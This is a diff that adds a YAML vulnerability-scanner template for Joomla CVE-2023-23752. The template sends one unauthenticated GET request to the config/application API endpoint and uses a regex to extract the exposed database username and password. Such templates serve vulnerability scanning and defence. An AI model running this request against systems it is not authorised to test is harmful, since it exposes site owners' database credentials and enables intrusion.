@@ -1,0 +1,34 @@
+id: joomla-cve-2023-23752
+
+info:
+  name: Joomla CVE-2023-23752
+  author: DoubleTake (https://twitter.com/LeDoubleTake)
+  description: Joomla has an issue in the /api/index.php/v1/config/application endpoint that can be exploited to disclose sensitive information by sending a GET request
+  severity: medium
+  reference: https://nvd.nist.gov/vuln/detail/CVE-2023-23752
+  tags:
+  - cve-2023-23752
+
+requests:
+  - method: GET
+    path: 
+      - "{{BaseURL}}/api/index.php/v1/config/application?public=true"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: body
+        status:
+          - 200
+          - 406
+      - type: word
+        part: response
+        words:
+          - "user"
+          - "pass"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"user":"(\w+)".*"password":"(\w+)"'
